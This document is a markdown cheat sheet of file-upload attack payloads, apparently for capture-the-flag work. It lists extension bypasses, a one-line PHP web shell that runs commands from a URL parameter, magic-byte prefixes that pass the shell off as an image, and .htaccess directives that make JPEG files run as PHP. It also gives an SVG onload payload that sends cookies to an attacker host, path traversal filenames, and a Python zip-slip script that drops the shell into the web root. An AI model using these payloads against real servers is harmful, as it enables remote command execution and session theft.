# Upload

## Extensions

```text
shell.php
shell.phtml
shell.php5
shell.phar
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.pHp
```

## PHP Webshell

```php
<?=`$_GET[0]`?>
```

```text
/uploads/shell.php?0=id
/uploads/shell.phtml?0=cat%20/flag*
```

## Magic Bytes

```bash
printf 'GIF89a;<?=`$_GET[0]`?>' > shell.php.gif
printf '\xff\xd8\xff\xe0<?=`$_GET[0]`?>' > shell.php.jpg
```

## .htaccess

```apache
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
```

Upload `.htaccess`, then upload:

```php
<?=`$_GET[0]`?>
```

as `shell.jpg`.

## SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://ATTACKER/?c='+document.cookie)"/>
```

## Path Guess

```text
/uploads/FILE
/upload/FILE
/static/uploads/FILE
/media/FILE
/files/FILE
/assets/FILE
```

## Filename Traversal

```text
../../../../tmp/shell.php
..%2f..%2f..%2ftmp%2fshell.php
....//....//tmp/shell.php
```

## Archive Upload

Zip slip filenames:

```text
../../../../var/www/html/shell.php
..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php
/var/www/html/shell.php
```

Create a zip with a traversal name:

```python
import zipfile

with zipfile.ZipFile("pwn.zip", "w") as z:
    z.writestr("../../../../var/www/html/shell.php", "<?=`$_GET[0]`?>")
```
